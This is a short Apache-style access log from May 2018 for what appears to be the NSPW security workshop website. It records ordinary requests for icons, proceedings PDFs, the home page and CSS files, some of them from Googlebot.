137.112.228.195 - - [02/May/2018:20:14:35 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:20:14:35 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:20:14:35 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
122.150.90.235 - - [02/May/2018:20:14:19 -0400] "GET /2009/proceedings/1993/nspw1993-strens.pdf HTTP/1.1" 206 180736 "https://www.nspw.org/2009/proceedings/1993/nspw1993-strens.pdf" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
122.150.90.235 - - [02/May/2018:20:14:38 -0400] "GET /2009/proceedings/1993/nspw1993-strens.pdf HTTP/1.1" 206 66333 "https://www.nspw.org/2009/proceedings/1993/nspw1993-strens.pdf" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
66.249.64.217 - - [02/May/2018:20:14:57 -0400] "GET /papers/2001/nspw2001-blakley.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
220.181.132.197 - - [02/May/2018:20:14:59 -0400] "GET / HTTP/1.1" 200 6643 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
220.181.132.197 - - [02/May/2018:20:14:59 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2303 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
220.181.132.197 - - [02/May/2018:20:15:00 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1029 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
220.181.132.197 - - [02/May/2018:20:15:00 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1734 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
220.181.132.197 - - [02/May/2018:20:15:00 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 902 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
220.181.132.197 - - [02/May/2018:20:15:00 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 517 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
220.181.132.197 - - [02/May/2018:20:15:00 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 597 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
